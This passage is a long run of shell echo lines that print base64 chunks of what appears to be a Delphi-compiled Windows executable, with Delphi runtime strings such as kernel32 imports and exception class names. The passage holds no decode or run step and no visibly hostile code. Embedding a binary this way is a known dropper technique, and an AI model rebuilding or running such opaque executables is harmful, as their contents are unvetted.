echo UPQx0o1MJBBkixqJGYlpCMdBBAEyQACJQQxkiQpbWVrD6ToBAACLRCQsi0AMhcB0
echo DosIsoFQ/1H8WOgJAAAA6KgCAADDjUAAixD/UvjDi8BTi9iLw4sQ/1Lki8Nbw4vA
echo hNJ/AcNQUosQ/1LoWljDkIA9JEBBAAF2EWoAagBqAGjf+u0O/xUUgEEAw5CAPSRA
echo QQAAdBdQUFJUagJqAGjk+u0O/xUUgEEAg8QIWMONQABUagFqAGjg+u0O/xUUgEEA
echo g8QEWMONQACAPSRAQQABdgdQU+nY////w41AAIXJdBmLQQGAOel0DIA563UMD77A
echo QUHrA4PBBQHBw4vAgD0kQEEAAXYdUFJR6M////9RVGoBagBo4frtDv8VFIBBAFlZ
echo WljDkIA9JEBBAAF2ElJUagFqAGji+u0O/xUUgEEAWsNQUoA9JEBBAAF2EFRqAmoA
echo aOP67Q7/FRSAQQBaWMOLwItEJAT3QAQGAAAAD4UTAQAAgTje+u0Oi1AYi0gUdG78
echo 6I/7//+LFRCAQQCF0g+E8QAAAP/ShcAPhOcAAACLVCQMi0wkBIE5zvrvDnQ36Nr+
echo //+APShAQQAAdimAPSRAQQAAdyCNTCQEUFHoyd3//4P4AFgPhKsAAACJwotEJASL
echo SAzrMInCi0QkBItIDIA9KEBBAAF2HoA9JEBBAAB3FVCNRCQIUlFQ6Izd//+D+ABZ
echo Wlh0cINIBAJTMdtWV1VkixtTUFJRi1QkKGoAUGgYNEAAUv8VGIBBAIt8JCjoByIA
echo AP+wAAAAAImgAAAAAItvCItfBMdHBEQ0QACDwwXoZv7////j6SMAAADo2iEAAIuI
echo AAAAAIsRiZAAAAAAi0EI6Sz7//+4AQAAAMOLwItEJASLVCQI90AEBgAAAHQfi0oE
echo x0IEnDRAAFNWV1WLagiDwQXoRv7////RXV9eW7gBAAAAw4vACcB1CrjYAAAA6IYF
echo AABaVFVXVlNQUlRqB2oBaN767Q5S/yUUgEEAw4tEJDDHQAQXNUAA6EwhAACLkAAA
echo AACLComIAAAAAItCDINgBP2BON767Q50DYtCCOiP+v//6Er9//8xwIPEFGSLEFmL
echo EokRXV9eW7gBAAAAw41AAOgDIQAAi5AAAAAAiwqJiAAAAACLQgjoVfr//1qLZCQs
echo McBZZIkIWF3ot/3////iwzHSi0wkCItEJASDwQVkiQL/0cIMAMOLwFWL7ItVCIsC
echo PZIAAMB/LHRcPY4AAMB/FXRXLQUAAMB0XC2HAAAAdD1IdE7rYAVx//8/g+gCcjZ0
echo MOtSPZYAAMB/EXQ9LZMAAMB0Lkh0E0h0JOs6Lf0AAMB0L4PoPXQm6yywyOsqsMnr
echo JrDN6yKwz+sesMjrGrDX6xawzusSsNjrDrDa6wqw2esGsMrrArD/Jf8AAACLUgzo
echo tPD//13CBACLRCQE90AEBgAAAA+FiQAAAIA9JEBBAAB3D41EJARQ6Ezb//+D+AB0
echo cYtEJAT86Ln4//+LVCQIagBQaE42QABS/xUYgEEAi1wkBIE73vrtDotTFItDGHQd
echo ixUQgEEAhdIPhPr+//+J2P/ShcAPhO7+//+LUwzonvz//4sNBIBBAIXJdAL/0YtM
echo JAS42QAAAItRFIkUJOmWAwAAMcDDjUAAMdKNRfRkiwpkiQKJCMdABAg2QACJaAij
echo NIZBAMONQAAx0qE0hkEAhcB0HGSLCjnIdQiLAGSJAsOLCYP5/3QIOQF19YsAiQHD
echo VYvsU1ZXvzCGQQCLRwiFwHRIi18Mi3AEM9JVaDY3QABk/zJkiSKF234SS4lfDItE
echo 3gSFwHQC/9CF23/uM8BaWVlkiRDrFOkF/P//6LD////oh/3//+jW/f//X15bXcOQ
echo VYvsU1ZXoTiGQQCFwHRLizAz24t4BDPSVWiWN0AAZP8yZIkiO/N+FIsE30OJHTyG
echo QQCFwHQC/9A783/sM8BaWVlkiRDrFOml+///6FD////oJ/3//+h2/f//X15bXcOQ
echo xwUUgEEAaBFAAMcFGIBBAHARQACjOIZBADPAozyGQQCJFUCGQQCLQgSjLIBBAOjF
echo /v//xgU0gEEAAOhh////w1Mx21dWizwYjXQYBItGBIsWiwQYAdrosRsAAIPGCE91
echo 615fW8ONQABTMdtXVos8GI10GASLRgSLFosEGANGCIkEGoPGDE917F5fW8NTVle+
echo aEBBALEQix0AQEEAi8O/CgAAAJn3/4DCMDPAisGIFAaLw7sKAAAAmff7i9hJhdt1
echo 27EcoQRAQQCL0IPiD4qSiEBBADPbitmIFB7B6ARJhcB15l9eW8OLwDHAhwUAQEEA
echo 99gZwEC/MIZBAItfGItvFP93HP93IIs3uQsAAADzpV9eycIMAMOLwFGAPUSAQQAA
echo dFdmgT0YgkEAstd1FIM9IIJBAAB2C7gUgkEA/xUwgkEAagCNRCQEUGoeaGhAQQBq
echo 9eha2P//UOh02P//agCNRCQEUGoCaFA5QABq9eg/2P//UOhZ2P//WsOAPSxAQQAA
echo dRNqAGhgQEEAaGhAQQBqAOhT2P//WsMA/////wIAAAANCgAAU1ZXVbswhkEAvgBA
echo QQC/QIBBAIB7KAB1FoM/AHQRixeJ0DPSiReL6P/Vgz8Ade+DPQRAQQAAdBHoq/7/
echo /+gy////M8CjBEBBAIB7KAJ1CoM+AHUFM8CJQwzoPv3//4B7KAF2BYM+AHQhi0MQ
echo hcB0Guj7FAAAi1MQi0IQO0IEdAqFwHQGUOjS1///6OX8//+AeygBdQP/UySAeygA
echo dAXoof7//4M7AHUXgz0kgEEAAHQG/xUkgEEAiwZQ6H3X//+LA1aL8Iv7uQsAAADz
echo pV7pdv///11fXlvDowBAQQDoHv///8OQjwUEQEEA6en////DixCF0nQcxwAAAAAA
echo i0r4SXwQ8P9K+HUKUI1C+Ojj6///WMOQU1aJw4nWixOF0nQaxwMAAAAAi0r4SXwO
echo 8P9K+HUIjUL46Lrr//+DwwROddpeW8OQhdJ0JItK+EF/GlBSi0L86FwAAACJwlhS
echo i0j86Pjs//9aWOsE8P9C+IcQhdJ0FItK+El8DvD/Svh1CI1C+Ohu6///w5CF0nQK
echo i0r4QX4E8P9C+IcQhdJ0FItK+El8DvD/Svh1CI1C+OhE6///w41AAIXAfiRQg8AK
echo g+D+UOgP6///WmbHRAL+AACDwAhaiVD8x0D4AQAAAMMxwMOQU1ZXicOJ1onPifjo
echo xP///4n5iceF9nQJicKJ8Ohb7P//idjo6P7//4k7X15bw4vAVYvsagBqAFJQi0UI
echo UFFqAKG4hUEAUOix1v//XcIEAJBVi+xSUItFCFBRagChuIVBAFDoddb//13CBACQ
echo U1ZXVYHEBPD//1CDxPyL8YkUJIv4hfZ/CYvH6IT+///rX41uAYH9/wcAAH0oVo1E
echo JAiLTCQEuv8PAADohP///4vYhdt8D41UJASLx4vL6EH////rLIvdA9uLx4vT6A4E
echo AABWiweLTCQEi9PoVP///4vYhdt9AjPbi8eL0+jvAwAAgcQEEAAAXV9eW8NSieK5
echo AQAAAOj7/v//WsOQMcmF0nQhUjoKdBc6SgF0ETpKAnQLOkoDdAWDwgTr6EJCQonR
echo WinR6cz+///DjUAAMcmF0nQtUmY7CnQgZjtKAnQXZjtKBHQOZjtKBnQFg8II6+SD
echo wgKDwgKDwgKJ0Vop0dHp6fz+///DjUAAMcmKCkLpgv7//8OQV1BRidcxwPKudQL3
echo 0VgBwVhf6Wn+///DMcmF0nQFi0r80enpxP7//8ONQACFwHQDi0D8w4XSdD+LCIXJ
echo D4Si/f//U1ZXicOJ1ot5/ItW/AH6Oc50F+gCAwAAifCLTvyLEwH66JTq//9fXlvD
echo 6OsCAACLA4n56+jDhdJ0YYXJD4Rg/f//OxB0XDsIdA5QUehR/f//Wljpmv///1NW
echo V4nTic5Qi0P8A0b86Kf9//+Jx4nCidiLS/zoQer//4n6ifCLTvwDU/zoMur//1iJ
echo +oX/dAP/T/joC/3//19eW8OJyukA/f//icrpSf///8NTVldSUInTMf+LTJQUhcl0
echo DDkIdQiJz4tB/ErrAjHAi0yUFIXJdAkDQfw5z3UCMf9KdeyF/3QXicKLBCSLd/zo
echo LAIAAIs8JP83AzdL6wjoFf3//1CJxotEnBiJ8oXAdAqLSPwBzuim6f//S3XpWliF
echo /3UMhdJ0A/9K+Oh5/P//Wl9eW1iNJJT/4MOLwFNWV4nGidc50A+EjwAAAIX2dGiF
echo /3Rri0b8i1f8KdB3AgHCUsHqAnQmiw6LHznZdVhKdBWLTgSLXwQ52XVLg8YIg8cI
echo SnXi6waDxgSDxwRag+IDdCKLDosfONl1QUp0Fzj9dTpKdBCB4wAA/wCB4QAA/wA5
echo 2XUnAcDrI4tX/CnQ6xyLRvwp0OsVWjjZdRA4/XUMwekQwesQONl1Ajj9X15bw4vA
echo hcB0CotQ+EJ+BPD/QPjDkIXAdALDALjlPkAAw4sQhdJ0OItK+El0MlOJw4tC/OgF
echo /P//icKLA4kTUItI/Oie6P//WItI+El8DvD/SPh1CI1A+Ogh5///ixNbidDDjUAA
echo 6bf////Di8Dpr////8OLwFOFwHQti1j8hdt0Jkp8GznafR8p04XJfBk52X8RAcKL
echo RCQI6Mz7///rETHS6+WJ2evri0QkCOjJ+v//W8IEAMNTVleJw4nWic/oov///4sT
echo hdJ0MItK/E58KjnOfSaF/34iKfE5z34Cic8p+QHyjQQX6Prn//+LE4nYi1L8Kfro
echo TAAAAF9eW8OFwHRAhdJ0MVNWV4nGideLT/xXi1b8SngbigZGKdF+FPKudRCJy1ZX
echo idHzpl9edAyJ2evsWjHA6wgxwMNaifgp0F9eW8ONQABTVleJw4nWMf+F0n5IiwOF
echo wHQjg3j4AXUdg+gIg8IJUIng6DHm//9Yg8AIiQOJcPzGBAYA6yiJ0Oi7+v//iceL
echo A4XAdBCJ+otI/DnxfAKJ8ehL5///idjo2Pn//4k7X15bw4vAsAHpleb//8OFwHQQ
echo UGoA6LjR//+FwA+E5P///8ONQACHEIXSdAZS6LDR///DjUAAixCF0nQOxwAAAAAA
echo UFLomdH//1jDjUAAU1aJw4nWiwOFwHQMxwMAAAAAUOh80f//g8METnXoXlvDjUAA
echo hdIPhLz///+LSvzR6Q+Esf///1FSUOhN0f//hcAPhHH////DU1ZXVYHEBPD//1CD
echo xPyL8YkUJIv4hfZ/CYvH6ID////rXY1uAYH9/wcAAH0oVo1EJAiLTCQEuv8HAADo
echo QPr//4vYhdt+D41UJASLx4vL6DkAAADrKovdi8eL0+iIAQAAVosHi0wkBIvT6BL6
echo //+L2IXbfQIz24vHi9PoaQEAAIHEBBAAAF1fXlvDi8CFyQ+EDP///1BRUuig0P//
echo hcAPhMz+//9a/zKJAuie0P//w5AxyYXSdC1SZjsKdCBmO0oCdBdmO0oEdA5mO0oG
echo dAWDwgjr5IPCAoPCAoPCAonRWinR0enppP///8ONQAAxyYXSdAOLSvzpBv///8OQ
echo hcB0BMOQAAC4BkJAAMOLwIXAdAWLQPzR6MOLwFNWV4nGidc50HRyhfZ0UYX/dFSL
echo RvyLV/wp0HcCAcJSweoCdCaLDosfOdl1QUp0FYtOBItfBDnZdTSDxgiDxwhKdeLr
echo BoPGBIPHBFqD4gJ0C2aLDmaLH2Y52XUhAcDrHYtX/CnQ6xaLRvwp0OsPWmY52XUJ
echo wekQwesQZjnZX15bw41AAFWL7FNWV4v5i9qL8IvG6F3///+D+wF9BDPb6wdLO8N9
echo AovYhf99BDPA6wgrwzv4fQKLx4vTA9ID1otNCJHorv7//19eW13CBACNQABTVleL
echo 8ov4M9uF9n4ni8bofP3//4vYiwfoB////4XAfhM78H0Ci8aLyAPJi9OLB+iQ5P//
echo i8eL0+hr/f//X15bw41AADHJU4pKAVZXicONdBEKi3wRBosWi0YEAdiLErkBAAAA
echo 6CcAAACDxghPf+eJ2F9eW8ONQACDPQxAQQAAdAf/FQxAQQDDsBDoleP//8OD+QAP
echo hOAAAABQU1ZXicOJ1onPMdKKBopWATwKdCU8C3Q+PAx0UTwNdFw8DnR2PA8PhIQA
echo AAA8EQ+EiwAAAOmXAAAAg/kBidh/Cuh59v//6ZEAAACJyuiR9v//6YUAAACD+QGJ
echo 2H8H6Lz8///rd4nK6Mv8///rbonYg8MQ6Gf///9Pf/PrX1WJ1YtULgqJ2ANcLgKL
echo TC4GixLoYv///09/6F3rQVWJ1YnYA1wuAony6AD///9Pf/Bd6yuJ2IPDBOj0CgAA
echo T3/z6xyJ2Inyg8ME6D8EAABPf/HrC19eW1iwAumv4v//X15bWMOLwLkBAAAA6Qr/
echo ///DkIM9FEBBAAB0B/8VFEBBAMOwEOiF4v//w1NWV1WJw4nWMcCKQQGNfAgKi2/8
echo McCLT/hRi08EKcF+C4nCAfAB2uj44v//i0cEixeLEooKgPkKdDGA+Qt0PYD5DHRJ
echo gPkNdFWA+Q50cID5Dw+EgAAAAID5EQ+EiAAAALACXV9eW+kZ4v//ixQwAdjol/X/
echo /7gEAAAA632LFDAB2OjO+///uAQAAADrbI0UMAHY6FH///+4EAAAAOtbMcmKSgH/
echo dBEC/3QRBotMEQqLCY0UMAHY6GEAAABY6zsxyYpKAYtMEQJRidGNFDAB2Ogs////
echo WOsiixQwAdjo3wkAALgEAAAA6xGJ0YsUMAHY6EwDAAC4BAAAAANHBIPHCE0PhRT/
echo //9ZKcF+Co0UGAHw6A/i//9dX15bw4vAU1ZXVYnDidaJz4tsJBSKD4D5CnQxgPkL
echo dEOA+Qx0UoD5DXRhgPkOdH2A+Q8PhJEAAACA+REPhJwAAACwAl1fXlvpIuH//4nY
echo ixboofT//4PDBIPGBE117umOAAAAidiLFujS+v//g8MEg8YETXXu63qJ2Iny6FL+
echo //+DwxCDxhBNde7rZjHJik8BjXw5AonYifKLTwj/dwToY////wMfAzdNderrRYnY
echo ifKJ+egz/v//McCKRwEDXDgCA3Q4Ak115esoidiLFujYCAAAg8MEg8YETXXu6xSJ
echo 2IsWifnoQgIAAIPDBIPGBE117F1fXlvCBADDkLAR6W3g///DUlCLRCQQ9yQkicGL
echo RCQE92QkDAHBiwQk92QkDAHKWVnCCADDhcB0A4tA/MPo8////0jDkFWL7P91COjF
echo /v//XcIEAJDpj/z//8OLwOibAQAAw4vAVYvsg8TgU1ZXiU34i/KJRfyLXfyLG4tF
echo CIs4hf9/GoX/fQewBOju3///i0X8i9boxP///+lKAQAAM8CJRfCF23QLg+sEiwOJ
echo RfCD6wQzwIpGAQHGi8aLUAKJVeiLUAaF0nQEizLrAjP2i8f3beiJReSLReSZ9/87
echo Reh0B7AE6JXf//+DReQIhdt0BYM7AXU1iV3gO33wfR2F9nQZi8ODwAiL1w+vVegD
echo wotN8CvPi9boO////41F4ItV5Oiw3v//i13g617/C4tF5Ohh3v//i9iLRfCJRew7
echo fex9A4l97IX2dCqLVewPr1Xoi8ODwAgzyegW4v//i0XsUItV/IsSi8ODwAiLzujV
echo /v//6xaLTewPr03oi9ODwgiLRfyLAOiV3///xwMBAAAAg8MEiTuDwwSL1ytV8A+v
echo VeiLRegPr0XwA8MzyejC4f//g334AX4ug0UIBP9N+E+F/3wiR8dF9AAAAACLRQhQ
echo i0X0jQSDi034i9boiP7///9F9E915otF/IkYX15bi+VdwgQAVIMEJAToav7//8OQ
echo iwiFyXQzxwAAAAAA8P9J+HUnUInIMcmKSgGLVBEGhdJ0DotI/IXJdAeLEui8+v//
echo g+gI6IDd//9Yw4vAU4sYhdJ0BPD/QviF23QU8P9L+HUOUFKJyv9D+Oij////WliJ
echo EFvDkIPE5GocjVQkBFJQ6DTJ//+BfCQQABAAAHUGi0QkBOsCM8CDxBzDi8BTVoHE
echo +P7//4vYg3sQAHUraAUBAACNRCQEUItDBFDoicj//4vEsgHoEAIAAIvwiXMQhfZ1
echo BotDBIlDEItDEIHECAEAAF5bw5CLFTBAQQCF0nQdO0IEdAo7Qgh0BTtCDHUIi8Lo
echo mP///8OLEoXSdePD6wZQ6PTH//+KEITSdAWA+lx178NVi+yBxLD9//9TVleJVfiJ
echo RfyLRfyJRfRoNEtAAOgOyP//i/CF9nRAaERLQABW6AXI//+Jw4XbdC9oBQEAAI2F
echo sf3//1CLRfxQ/9OFwHQZi0X4UI2Fsf3//1CLRfxQ6P3H///pIgEAAItF/IA4XHU4
echo i0X8gHgBXA+FDQEAAItF/IPAAuhk////i/CAPgAPhPcAAACNRgHoUf///4vwgD4A
echo D4TkAAAA6waLdfyDxgKL3itd/I1DAVCLRfxQjYWx/f//UOiZx///6aEAAACNRgHo
echo GP///4v4i8crxovQA9NCgfoFAQAAD4+fAAAAQFBWjYWx/f//A8NQ6GTH//+Nhbb+
echo //9QjYWx/f//UOj5xv//i/CD/v90dFbo5Mb//42F4v7//1DoQMf//41TAQPCQD0F
echo AQAAf1XGhB2x/f//XLgFAQAAK8NIUI2F4v7//1CNhbH9//8Dw0BQ6ATH//+NheL+
echo //9Q6ADH//9AA9iL94A+AA+FVv///4tF+FCNhbH9//9Qi0X8UOjWxv//i0X0X15b
echo i+Vdw2tlcm5lbDMyLmRsbAAAAABHZXRMb25nUGF0aE5hbWVBAAAAAFWL7IHE4P7/
echo /1NWiUX8aAUBAACNheP+//9QagDoT8b//8ZF7gCNRfhQaBkADwBqAGiITUAAaAEA
echo AIDoicb//4XAdECNRfhQaBkADwBqAGiITUAAaAIAAIDoa8b//4XAdCKNRfhQaBkA
echo DwBqAGikTUAAaAEAAIDoTcb//4XAD4WJAAAAM8BVaF1MQABk/zBkiSDHRegFAAAA
echo jYXj/v//ugUBAADooP3//41F6FCNRe5QagBqAI2F4/7//1CLRfhQ6AzG//+FwHQi
echo jUXoUI1F7lBqAGoAaMRNQACLRfhQ6O7F//+FwHQExkXuAMZF8gAzwFpZWWSJEGhk
echo TEAAi0X4UOi8xf//w+kK6P//6+9oBQEAAItF/FCNheP+//9Q6IfF//9qBY1F81Bq
echo A+hixf//UOg0xf//M/aAveP+//8AD4TjAAAAgH3zAHUKgH3uAA+E0wAAAI2F4/7/
echo /1DoUcX//4vYjYXj/v//A9jrAUuAOy50Co2F4/7//zvYdfCNheP+//872A+EnQAA
echo AEOAfe4AdCiL0yvQuAUBAAArwlCNRe5QU+gCxf//agJqAI2F4/7//1Do4sT//4vw
echo hfZ1aoB98wB0ZI2F4/7//4vTK9C4BQEAACvCUI1F81BT6MrE//9qAmoAjYXj/v//
echo UOiqxP//i/CF9nUyxkX1AI2F4/7//4vTK9C4BQEAACvCUI1F81BT6JTE//9qAmoA
echo jYXj/v//UOh0xP//i/CLxl5bi+VdwwAAU29mdHdhcmVcQm9ybGFuZFxMb2NhbGVz
echo AAAAAFNvZnR3YXJlXEJvcmxhbmRcRGVscGhpXExvY2FsZXMAAAAAAOgLAAAAw4vA
echo 6CMAAADDi8BTi9i4CAAAAOhD2P//ixU0QEEAiRCJWASjNEBBAFvDkFNWizU0QEEA
echo hfZ0IotWBDvQdRuhNEBBAIsAozRAQQC6CAAAAIvG6CXY//9eW8OL1oXSdCeLCoXJ
echo dBuLWQQ72HUUi/GLAYkCuggAAACLxuj91///6waLEoXSddleW8OLwFWL7IPE+FNW
echo V4lF/KE0QEEAiUX4g334AHQ5M8BVaJNOQABk/zBkiSCLXfiLRfz/UwQzwFpZWWSJ
echo EOsK6ajk///og+b//4tF+IsAiUX4g334AHXHX15bWVldw4vAixUwQEEAiRCjMEBB
echo AMOLwFWL7FGJRfwz0lVoKE9AAGT/MmSJIotF/ItABOh0////M8BaWVlkiRBoL09A
echo AItF/DsFMEBBAHUMi0X8iwCjMEBBAOsfoTBAQQCFwHQWixA7Vfx1CYtV/IsSiRDr
echo BosAhcB16sPpP+X//+vCWV3Di8CLEIXSdA7HAAAAAABQUosC/1AIWMONQACF0nQZ
echo UlCLAlL/UARYiwiPAIXJdQHDiwFR/1AIw4sIhcmJEHQGiwFR/1AIw4PABFDo38L/
echo /8OLwIN4BAB0B7AC6H/X///Di8Doj9///8dABAEAAADDjUAAVYvsU4tdCItNEItV
echo DIvD6Izg//+EwHQEM8DrBbgCQACAW13CDACLwFWL7ItFCIPABFDofcL//13CBACQ
echo VYvsU1aLXQiNQwRQ6G/C//+L8IX2dQmyAYvDiwj/UfyLxl5bXcIEAFWL7IPE+FNW
echo iU34iVX8M9KDffgAD4S4AAAAM/YzyYXAD4SHAAAA62yLVfgPtxRKQYP6f3cGiBQw
echo RutZgfr/BwAAdjGNXgM7Xfx3U4vawesMgMvgiBwwi9rB6waA4z+Ay4CIXDABgOI/
echo gMqAiFQwAoPGA+sgjV4CO138dyKL2sHrBoDLwIgcMIDiP4DKgIhUMAGDxgI7TQhz
echo BTt1/HKKO3X8cgSLdfxOxgQwAOsiO00Icx2LRfgPtxRIQYP6f3YKgfr/BwAAdgFG
echo RkY7TQhy441WAYvCXltZWV3CBABVi+yDxPBTVolN9IlV+IlF/IN99AB1CjPAiUXw
echo 6QkBAADHRfD/////M8Az9oN9/AAPhKkAAADpggAAAItV9DPJigwyRvbBgHRsO3UI
echo D4PYAAAAg+E/9sEgdC6LVfSKFDJGi9qA48CA+4APhbsAAAA7dQgPg7IAAACA4j+B
echo 4v8AAADB4QYL0YvKi1X0ihQyRovagOPAgPuAD4WNAAAAgOI/geL/AAAAweEGZgvR
echo i038ZokUQesHi1X8ZokMQkA7dQhzCTtF+A+CcP///ztF+HIEi0X4SItV/GbHBEIA
echo AOtHO3UIc0KLVfSKFDJG9sKAdDA7dQhzNYDiP/bCIHQUi1X0ihQyRoDiwID6gHUe
echo O3UIcxmLVfSKFDJGgOLAgPqAdQpAO3UIcr5AiUXwi0XwXluL5V3CBACNQABVi+xq
echo AFNWi/KL2DPAVWi7UkAAZP8wZIkgi8boCOj//4vDM9Lo1+///3Rei8Powu///40U
echo QI1F/Oi37f//i8PosO///1CLRfzod+r//0BQi8Poju///1CLRfzoZez//1la6Ib9
echo //+FwH4Ni9BKjUX86H/t///rCI1F/Oip5///i8aLVfzo8+f//zPAWllZZIkQaMJS
echo QACNRfzoiuf//8PprOH//+vwXltZXcOQVYvsagBTVovyi9gzwFVoX1NAAGT/MGSJ
echo IIvG6Lzt//+F23Rdi8Po7en//4vQjUX86O/v//+Lw+jc6f//UItF/OgD7///QFCL
echo w+jK6///UItF/Ojh7v//WVrovv3//4XAfg2L0EqNRfzot+///+sIjUX86GXt//+L
echo xotV/OiX7f//M8BaWVlkiRBoZlNAAI1F/OhG7f//w+kI4f//6/BeW1ldw5BVi+xq
echo AFNWi/KL2DPAVWivU0AAZP8wZIkgjUX8i9PoYe7//4tF/IvW6IP+//8zwFpZWWSJ
echo EGi2U0AAjUX86Pbs///D6bjg///r8F5bWV3DkFNWgcQA/P//i/KL2IXbdD2BewQA
echo AAEAfSpoAAQAAI1EJARQi0MEUIsDiwDoePX//1DoBr7//4vIi9SLxug35///6wqL
echo xotTBOgz6P//gcQABAAAXlvDi8BVi+yDxPBTM9KJVfAz0lVoelRAAGT/MmSJImoH
echo jVX1UmgEEAAAUOiBvf//jUXwjVX1uQcAAADoZej//4tF8I1V/OjK1f//i9iDffwA
echo dAIz2zPAWllZZIkQaIFUQACNRfDoy+X//8Pp7d///+vwi8Nbi+Vdw1WL7DPAVWjS
echo VEAAZP8wZIkg/wW0hUEAdSO4SIBBAOgB1f//uBSCQQDo99T//7jgg0EA6O3U///o
echo aMX//zPAWllZZIkQaNlUQADD6ZXf///r+F3DkIMttIVBAAEPg8UAAADGBQhAQQAC
echo xwUUgEEAaBFAAMcFGIBBAHARQADGBUaAQQACxwUAgEEAnEZAAOjm2P//hMB0BegN
echo 2f//6MzZ//9mxwVMgEEAsNdmxwUYgkEAsNdmxwXkg0EAsNfocLz//6M8gEEA6Ca9
echo //+jOIBBAOgUvf//JQAAAIA9AAAAgHQt6AO9//8l/wAAAGaD+AR2DMcFuIVBAAMA
echo AADrIOhfvP//6Ib+//+juIVBAOsP6E68///odf7//6O4hUEA6L+8//+jMIBBAMOQ
echo /yXkwUEAi8D/JeDBQQCLwP8l3MFBAIvA/yXYwUEAi8BQakDo4P///8ONQAC4DAAA
echo AMOLwFPo8v///4vYhdt0NoM9mEBBAP91CrjiAAAA6DXk//+Lw+jG////hcB1DLji
echo AAAA6CDk///rDFChmEBBAFDoov///1vDig1chkEAoZhAQQCEyXUmZIsVLAAAAIsE
echo gsPonf///6GYQEEAUOhu////hcB0AcOhaIZBAMNQ6F3///+FwHTbw7icQEEA6EL4
echo ///DkFOL2DPAo5hAQQBqAOgr////o2CGQQChYIZBAKOgQEEAM8CjpEBBADPAo6hA
echo QQDowf///7qcQEEAi8Po/eD//1vDjUAAVYvsM8BVaN1WQABk/zBkiSD/BWSGQQAz
echo wFpZWWSJEGjkVkAAw+mK3f//6/hdw4vAgy1khkEAAcNVi+wzwFVoFVdAAGT/MGSJ
echo IP8FbIZBADPAWllZZIkQaBxXQADD6VLd///r+F3Di8CDLWyGQQABw/8lFMJBAIvA
echo /yUQwkEAi8D/JQzCQQCLwP8lCMJBAIvA/yUEwkEAi8D/JQDCQQCLwP8l/MFBAIvA
echo /yX4wUEAi8D/JfTBQQCLwP8l8MFBAIvA/yXswUEAi8D/JbDCQQCLwP8lrMJBAIvA
echo /yWowkEAi8D/JaTCQQCLwP8lpMJBAIvA/yWgwkEAi8D/JZzCQQCLwP8lmMJBAIvA
echo /yWUwkEAi8D/JZDCQQCLwP8ljMJBAIvA/yWIwkEAi8D/JYTCQQCLwP8lgMJBAIvA
echo /yV8wkEAi8D/JXjCQQCLwP8ldMJBAIvA/yVwwkEAi8D/JWzCQQCLwP8laMJBAIvA
echo /yVkwkEAi8D/JWDCQQCLwP8lXMJBAIvA/yVYwkEAi8D/JVTCQQCLwP8lUMJBAIvA
echo /yVMwkEAi8D/JUjCQQCLwP8lRMJBAIvA/yVAwkEAi8D/JTzCQQCLwP8lOMJBAIvA
echo /yU0wkEAi8D/JTDCQQCLwP8lLMJBAIvA/yUowkEAi8D/JSTCQQCLwP8lIMJBAIvA
echo /yUcwkEAi8D/JdDCQQCLwP8l1MJBAIvA/yXMwkEAi8D/JcjCQQCLwP8lxMJBAIvA
echo /yXAwkEAi8D/JbzCQQCLwP8luMJBAIvAM8noBdH//8NVi+wzwFVoJVlAAGT/MGSJ
echo IP8FcIZBADPAWllZZIkQaCxZQADD6ULb///r+F3Di8CDLXCGQQABw2CGQQDw/wAA
echo YIZBAPH/AABghkEA8v8AAGCGQQDz/wAAYIZBAPT/AABghkEA9f8AAGCGQQD2/wAA
echo YIZBAPf/AABghkEA+P8AAGCGQQD5/wAAYIZBAPr/AABghkEA+/8AAGCGQQD8/wAA
echo YIZBAP3/AABghkEA/v8AAGCGQQD//wAAYIZBAOD/AABghkEA4f8AAGCGQQDi/wAA
echo YIZBAOP/AABghkEA5P8AAGCGQQDl/wAAYIZBAOb/AABghkEA5/8AAGCGQQDo/wAA
echo YIZBAOn/AABghkEA6v8AAGCGQQDr/wAAYIZBAOz/AABghkEA7f8AAGCGQQDu/wAA
echo YIZBAO//AABghkEA0P8AAGCGQQDR/wAAYIZBANL/AABghkEA0/8AAGCGQQDU/wAA
echo YIZBANX/AABghkEA1v8AAGCGQQDX/wAAYIZBANj/AABghkEA2f8AAGCGQQDa/wAA
echo YIZBANv/AABghkEA3P8AAGCGQQDd/wAAYIZBAN7/AABghkEA3/8AAGCGQQDA/wAA
echo YIZBAMH/AABghkEAwv8AAGCGQQDD/wAAYIZBAMT/AABghkEAxf8AAGCGQQDG/wAA
echo YIZBAMf/AABghkEAyP8AAGCGQQDJ/wAAYIZBAMr/AABghkEAy/8AAGCGQQDM/wAA
echo YIZBAM3/AABghkEAzv8AAGCGQQDP/wAAYIZBALD/AABghkEAsf8AAGCGQQCy/wAA
echo YIZBALP/AABghkEAtP8AAGCGQQC1/wAAYIZBALb/AABghkEAt/8AAGCGQQC4/wAA
echo YIZBALn/AABghkEAuv8AAGCGQQC7/wAAYIZBALz/AABghkEAvf8AAGCGQQC+/wAA
echo YIZBAL//AABghkEAoP8AAGCGQQCh/wAAYIZBAKL/AABghkEAo/8AAGCGQQCk/wAA
echo YIZBAKX/AABghkEApv8AAGCGQQCn/wAAYIZBAKj/AABghkEAqf8AAFWL7DPAVWgt
echo XEAAZP8wZIkg/wV0hkEAM8BaWVlkiRBoNFxAAMPpOtj//+v4XcOLwIMtdIZBAAHD
echo jFxAAAAAAAAAAAAAjFxAAAAAAAAAAAAAAAAAAAAAAACeXEAADAAAAAwQQACcMUAA
echo qDFAAKwxQACwMUAApDFAACgvQABEL0AAgC9AAA4AAAAAAAEAAAAAEEAABAAAAAlF
echo eGNlcHRpb270XEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPRcQAAQAAAA
echo QFxAAJwxQACoMUAArDFAALAxQACkMUAAKC9AAGCfQACAL0AADkVIZWFwRXhjZXB0
echo aW9ukFBdQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUF1AABAAAACoXEAA
echo nDFAAKgxQACsMUAAsDFAAKQxQAAoL0AAYJ9AAIAvQAAMRU91dE9mTWVtb3J5jUAA
echo rF1AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACsXUAAEAAAAEBcQACcMUAA
echo qDFAAKwxQACwMUAApDFAACgvQABEL0AAgC9AAAtFSW5PdXRFcnJvcgReQAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABF5AABAAAABAXEAAnDFAAKgxQACsMUAA
echo sDFAAKQxQAAoL0AARC9AAIAvQAAJRUV4dGVybmFsi8BcXkAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAFxeQAAQAAAAuF1AAJwxQACoMUAArDFAALAxQACkMUAA
echo KC9AAEQvQACAL0AAEkVFeHRlcm5hbEV4Y2VwdGlvbpC8XkAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAALxeQAAQAAAAuF1AAJwxQACoMUAArDFAALAxQACkMUAA
